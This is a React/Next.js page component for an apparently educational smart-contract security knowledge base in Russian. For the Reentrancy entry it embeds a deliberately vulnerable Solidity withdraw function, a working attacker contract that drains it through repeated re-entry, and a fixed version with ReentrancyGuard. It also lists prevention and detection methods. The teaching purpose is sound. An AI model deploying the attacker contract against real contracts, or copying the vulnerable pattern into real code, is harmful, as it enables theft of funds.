import { ArrowLeft, BookOpen, Code, FileText, Share2 } from "lucide-react"
import Link from "next/link"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { SessionNavBar } from "@/components/session-nav-bar"

export default function VulnerabilityDetail({ params }: { params: { id: string } }) {
  // В реальном приложении здесь был бы запрос к API или базе данных
  const vulnerability = getVulnerabilityById(params.id)

  if (!vulnerability) {
    return (
      <div className="flex min-h-screen bg-firmament">
        <SessionNavBar />
        <div className="flex-1 p-6 md:p-8 ml-[3.05rem] flex items-center justify-center">
          <div className="text-center">
            <h1 className="text-2xl font-bold text-autumn mb-4">Уязвимость не найдена</h1>
            <Button asChild>
              <Link href="/knowledge">Вернуться к базе знаний</Link>
            </Button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="flex min-h-screen bg-firmament">
      {/* Sidebar */}
      <SessionNavBar />

      {/* Main Content */}
      <div className="flex-1 p-6 md:p-8 ml-[3.05rem]">
        <div className="mb-6">
          <Button variant="outline" size="sm" className="mb-4 border-firmament-lighter text-autumn" asChild>
            <Link href="/knowledge" className="flex items-center gap-2">
              <ArrowLeft className="size-4" />
              Назад к базе знаний
            </Link>
          </Button>

          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
            <div>
              <div className="flex items-center gap-2 mb-2">
                <h1 className="text-3xl font-bold text-autumn">{vulnerability.name}</h1>
                <Badge className={getSeverityColor(vulnerability.severity)}>{vulnerability.severity}</Badge>
              </div>
              <p className="text-autumn-muted">{vulnerability.shortDescription}</p>
            </div>
            <div className="flex gap-2">
              <Button variant="outline" size="sm" className="border-firmament-lighter text-autumn">
                <Share2 className="size-4 mr-2" />
                Поделиться
              </Button>
              <Button className="bg-demonic hover:bg-demonic/90">Проверить контракт</Button>
            </div>
          </div>
        </div>

        <div className="grid md:grid-cols-3 gap-6">
          <div className="md:col-span-2 space-y-6">
            <Tabs defaultValue="overview" className="w-full">
              <TabsList className="bg-firmament-light">
                <TabsTrigger value="overview" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Обзор
                </TabsTrigger>
                <TabsTrigger value="examples" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Примеры
                </TabsTrigger>
                <TabsTrigger value="prevention" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Предотвращение
                </TabsTrigger>
                <TabsTrigger value="detection" className="text-autumn data-[state=active]:bg-firmament-lighter">
                  Обнаружение
                </TabsTrigger>
              </TabsList>

              <TabsContent value="overview" className="mt-6">
                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Описание</CardTitle>
                  </CardHeader>
                  <CardContent className="text-autumn/80 space-y-4">
                    <p>{vulnerability.description}</p>
                    <p>
                      {vulnerability.name === "Reentrancy"
                        ? "Атака повторного входа (Reentrancy) происходит, когда внешний контракт вызывает функцию уязвимого контракта, которая в свою очередь вызывает внешний контракт снова, прежде чем завершится первый вызов. Это может привести к неожиданному поведению, включая многократное снятие средств."
                        : "Подробное описание уязвимости будет здесь. Оно включает в себя технические детали, историю обнаружения и примеры реальных инцидентов, связанных с этой уязвимостью."}
                    </p>
                    <p>
                      {vulnerability.name === "Reentrancy"
                        ? "Самый известный пример атаки повторного входа - взлом The DAO в 2016 году, который привел к потере около 60 миллионов долларов в эквиваленте ETH и последующему хардфорку Ethereum."
                        : "Эта уязвимость может привести к серьезным последствиям, включая потерю средств, нарушение логики контракта или полную компрометацию системы."}
                    </p>
                  </CardContent>
                </Card>

                <Card className="bg-firmament-light border-firmament-lighter mt-6">
                  <CardHeader>
                    <CardTitle className="text-autumn">Механизм атаки</CardTitle>
                  </CardHeader>
                  <CardContent className="text-autumn/80">
                    <ol className="list-decimal pl-5 space-y-2">
                      <li>
                        {vulnerability.name === "Reentrancy"
                          ? "Атакующий создает вредоносный контракт с функцией fallback(), которая повторно вызывает уязвимую функцию."
                          : "Первый шаг в механизме атаки."}
                      </li>
                      <li>
                        {vulnerability.name === "Reentrancy"
                          ? "Атакующий вызывает функцию withdraw() уязвимого контракта."
                          : "Второй шаг в механизме атаки."}
                      </li>
                      <li>
                        {vulnerability.name === "Reentrancy"
                          ? "Уязвимый контракт отправляет ETH вредоносному контракту, что активирует функцию fallback()."
                          : "Третий шаг в механизме атаки."}
                      </li>
                      <li>
                        {vulnerability.name === "Reentrancy"
                          ? "Функция fallback() повторно вызывает withdraw() до того, как баланс атакующего будет обновлен."
                          : "Четвертый шаг в механизме атаки."}
                      </li>
                      <li>
                        {vulnerability.name === "Reentrancy"
                          ? "Этот цикл повторяется, позволяя атакующему многократно снимать средства."
                          : "Заключительный шаг в механизме атаки."}
                      </li>
                    </ol>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="examples" className="mt-6">
                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Уязвимый код</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="rounded-md bg-firmament p-4 overflow-x-auto">
                      <pre className="text-xs text-autumn-muted">
                        {vulnerability.name === "Reentrancy" ? (
                          <code>
                            {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        
        // Уязвимость: отправка средств происходит до обновления баланса
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        
        balances[msg.sender] = 0;
    }
}`}
                          </code>
                        ) : (
                          <code>{`// Здесь будет пример уязвимого кода для ${vulnerability.name}`}</code>
                        )}
                      </pre>
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-firmament-light border-firmament-lighter mt-6">
                  <CardHeader>
                    <CardTitle className="text-autumn">Контракт атакующего</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="rounded-md bg-firmament p-4 overflow-x-auto">
                      <pre className="text-xs text-autumn-muted">
                        {vulnerability.name === "Reentrancy" ? (
                          <code>
                            {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackerContract {
    IVulnerableContract public vulnerableContract;
    
    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
    }
    
    // Функция для атаки
    function attack() external payable {
        // Сначала делаем депозит
        vulnerableContract.deposit{value: msg.value}();
        // Затем вызываем withdraw, что запустит атаку
        vulnerableContract.withdraw();
    }
    
    // Функция fallback вызывается при получении ETH
    receive() external payable {
        // Если на контракте остались средства, продолжаем атаку
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw();
        }
    }
}`}
                          </code>
                        ) : (
                          <code>{`// Здесь будет пример контракта атакующего для ${vulnerability.name}`}</code>
                        )}
                      </pre>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="prevention" className="mt-6">
                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Методы предотвращения</CardTitle>
                  </CardHeader>
                  <CardContent className="text-autumn/80">
                    <ul className="space-y-4">
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-atomic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Шаблон Checks-Effects-Interactions:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Следуйте шаблону Checks-Effects-Interactions: сначала выполняйте все проверки, затем изменяйте состояние контракта, и только потом взаимодействуйте с внешними контрактами."
                              : "Используйте проверенные шаблоны проектирования для предотвращения этой уязвимости."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-atomic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Использование ReentrancyGuard:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Используйте модификатор nonReentrant из библиотеки OpenZeppelin ReentrancyGuard для защиты функций от повторного входа."
                              : "Применяйте специализированные защитные механизмы и библиотеки."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-atomic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Обновление состояния перед внешними вызовами:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Всегда обновляйте балансы и состояние контракта перед отправкой ETH или вызовом внешних контрактов."
                              : "Следуйте принципу наименьших привилегий при проектировании контрактов."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-atomic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Использование transfer() вместо call():</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Рассмотрите возможность использования transfer() или send(), которые имеют ограничение газа 2300, что недостаточно для повторного вызова сложных функций."
                              : "Используйте безопасные методы для взаимодействия с внешними контрактами."}
                          </p>
                        </div>
                      </li>
                    </ul>
                  </CardContent>
                </Card>

                <Card className="bg-firmament-light border-firmament-lighter mt-6">
                  <CardHeader>
                    <CardTitle className="text-autumn">Безопасный код</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="rounded-md bg-firmament p-4 overflow-x-auto">
                      <pre className="text-xs text-autumn-muted">
                        {vulnerability.name === "Reentrancy" ? (
                          <code>
                            {`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureContract is ReentrancyGuard {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // Используем модификатор nonReentrant для защиты
    function withdraw() public nonReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0);
        
        // Сначала обновляем состояние, затем отправляем средства
        balances[msg.sender] = 0;
        
        // Отправка средств происходит после обновления баланса
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }
}`}
                          </code>
                        ) : (
                          <code>{`// Здесь будет пример безопасного кода для ${vulnerability.name}`}</code>
                        )}
                      </pre>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="detection" className="mt-6">
                <Card className="bg-firmament-light border-firmament-lighter">
                  <CardHeader>
                    <CardTitle className="text-autumn">Методы обнаружения</CardTitle>
                  </CardHeader>
                  <CardContent className="text-autumn/80">
                    <ul className="space-y-4">
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-demonic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Статический анализ:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Используйте инструменты статического анализа, такие как Slither, Mythril или MythX, которые могут обнаружить потенциальные уязвимости повторного входа."
                              : "Применяйте инструменты статического анализа для проверки кода на наличие уязвимостей."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-demonic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Ручной аудит:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Проверьте все функции, которые отправляют ETH или токены, и убедитесь, что они следуют шаблону Checks-Effects-Interactions."
                              : "Проводите регулярный ручной аудит кода с участием экспертов по безопасности."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-demonic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Фаззинг-тестирование:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Используйте инструменты фаззинга, такие как Echidna, для генерации тестовых сценариев, которые могут выявить уязвимости повторного входа."
                              : "Применяйте методы фаззинг-тестирования для выявления неожиданного поведения контракта."}
                          </p>
                        </div>
                      </li>
                      <li className="flex items-start">
                        <div className="size-1.5 rounded-full bg-demonic mt-1.5 mr-2 shrink-0"></div>
                        <div>
                          <strong className="text-autumn">Формальная верификация:</strong>
                          <p className="mt-1">
                            {vulnerability.name === "Reentrancy"
                              ? "Рассмотрите возможность использования инструментов формальной верификации, таких как Certora Prover, для математического доказательства отсутствия уязвимостей повторного входа."
                              : "Используйте методы формальной верификации для доказательства корректности контракта."}
                          </p>
                        </div>
                      </li>
                    </ul>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>

          <div className="space-y-6">
            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Информация</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div>
                    <p className="text-autumn-muted text-sm">Категория</p>
                    <p className="text-autumn">
                      {vulnerability.name === "Reentrancy" ? "Логические ошибки" : "Категория уязвимости"}
                    </p>
                  </div>
                  <div>
                    <p className="text-autumn-muted text-sm">Серьезность</p>
                    <Badge className={getSeverityColor(vulnerability.severity)}>{vulnerability.severity}</Badge>
                  </div>
                  <div>
                    <p className="text-autumn-muted text-sm">Стандарт CWE</p>
                    <p className="text-autumn">{vulnerability.name === "Reentrancy" ? "CWE-841" : "CWE-XXX"}</p>
                  </div>
                  <div>
                    <p className="text-autumn-muted text-sm">Обновлено</p>
                    <p className="text-autumn">15 апреля 2023</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Связанные ресурсы</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  <Link href="#" className="flex items-center gap-2 text-autumn hover:text-atomic transition-colors">
                    <FileText className="size-4" />
                    <span>Технический отчет о {vulnerability.name}</span>
                  </Link>
                  <Link href="#" className="flex items-center gap-2 text-autumn hover:text-atomic transition-colors">
                    <BookOpen className="size-4" />
                    <span>Руководство по предотвращению</span>
                  </Link>
                  <Link href="#" className="flex items-center gap-2 text-autumn hover:text-atomic transition-colors">
                    <Code className="size-4" />
                    <span>Примеры безопасного кода</span>
                  </Link>
                  <Separator className="bg-firmament-lighter" />
                  <Link href="#" className="flex items-center gap-2 text-autumn hover:text-atomic transition-colors">
                    <BookOpen className="size-4" />
                    <span>Блог: Анализ реальных атак</span>
                  </Link>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-firmament-light border-firmament-lighter">
              <CardHeader>
                <CardTitle className="text-autumn">Похожие уязвимости</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {relatedVulnerabilities
                    .filter((v) => v.name !== vulnerability.name)
                    .slice(0, 3)
                    .map((vuln, index) => (
                      <Link
                        key={index}
                        href={`/knowledge/${vuln.id}`}
                        className="flex items-start gap-2 p-2 rounded-md hover:bg-firmament-lighter transition-colors"
                      >
                        <div
                          className={`size-1.5 rounded-full ${getSeverityColorBg(vuln.severity)} mt-1.5 shrink-0`}
                        ></div>
                        <div>
                          <p className="text-autumn font-medium">{vuln.name}</p>
                          <p className="text-autumn/70 text-sm">{vuln.shortDescription}</p>
                        </div>
                      </Link>
                    ))}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}

// Вспомогательные функции
function getVulnerabilityById(id: string) {
  const allVulnerabilities = [
    {
      id: "reentrancy",
      name: "Reentrancy",
      severity: "Критическая",
      shortDescription: "Повторный вход в контракт до завершения предыдущего вызова",
      description:
        "Уязвимость, позволяющая атакующему повторно войти в контракт до завершения предыдущего вызова, что может привести к неожиданному поведению, включая кражу средств. Это одна из самых известных уязвимостей, которая привела к взлому The DAO в 2016 году.",
    },
    {
      id: "integer-overflow",
      name: "Integer Overflow/Underflow",
      severity: "Высокая",
      shortDescription: "Арифметические операции, превышающие диапазон типа данных",
      description:
        "Возникает, когда арифметическая операция пытается создать числовое значение, которое выходит за пределы диапазона, который может быть представлен выделенным количеством битов. В Solidity это может привести к неожиданным результатам и потенциальной потере средств.",
    },
    {
      id: "access-control",
      name: "Access Control",
      severity: "Высокая",
      shortDescription: "Недостаточная проверка прав доступа к функциям",
      description:
        "Неправильная реализация контроля доступа может позволить неавторизованным пользователям выполнять привилегированные функции, такие как вывод средств или изменение критических параметров контракта.",
    },
    {
      id: "front-running",
      name: "Front-Running",
      severity: "Средняя",
      shortDescription: "Манипуляция порядком транзакций для получения выгоды",
      description:
        "Атака, при которой злоумышленник наблюдает за пулом транзакций и размещает свою транзакцию с более высокой комиссией, чтобы она была выполнена раньше наблюдаемой транзакции, получая таким образом выгоду.",
    },
    {
      id: "timestamp-dependence",
      name: "Timestamp Dependence",
      severity: "Средняя",
      shortDescription: "Использование block.timestamp для критических операций",
      description:
        "Уязвимость, возникающая при использовании block.timestamp в качестве источника случайности или для критических временных проверок. Майнеры могут манипулировать временной меткой блока в определенных пределах.",
    },
  ]

  return allVulnerabilities.find((v) => v.id === id)
}

const relatedVulnerabilities = [
  {
    id: "reentrancy",
    name: "Reentrancy",
    severity: "Критическая",
    shortDescription: "Повторный вход в контракт до завершения предыдущего вызова",
  },
  {
    id: "integer-overflow",
    name: "Integer Overflow/Underflow",
    severity: "Высокая",
    shortDescription: "Арифметические операции, превышающие диапазон типа данных",
  },
  {
    id: "access-control",
    name: "Access Control",
    severity: "Высокая",
    shortDescription: "Недостаточная проверка прав доступа к функциям",
  },
  {
    id: "front-running",
    name: "Front-Running",
    severity: "Средняя",
    shortDescription: "Манипуляция порядком транзакций для получения выгоды",
  },
]

// Вспомогательные функции для цветов
function getSeverityColor(severity) {
  switch (severity) {
    case "Критическая":
      return "bg-demonic/20 text-demonic border-demonic/30"
    case "Высокая":
      return "bg-atomic/20 text-atomic border-atomic/30"
    case "Средняя":
      return "bg-yellow-500/20 text-yellow-500 border-yellow-500/30"
    case "Низкая":
      return "bg-green-500/20 text-green-500 border-green-500/30"
    default:
      return "bg-autumn/20 text-autumn border-autumn/30"
  }
}

function getSeverityColorBg(severity) {
  switch (severity) {
    case "Критическая":
      return "bg-demonic"
    case "Высокая":
      return "bg-atomic"
    case "Средняя":
      return "bg-yellow-500"
    case "Низкая":
      return "bg-green-500"
    default:
      return "bg-autumn"
  }
}
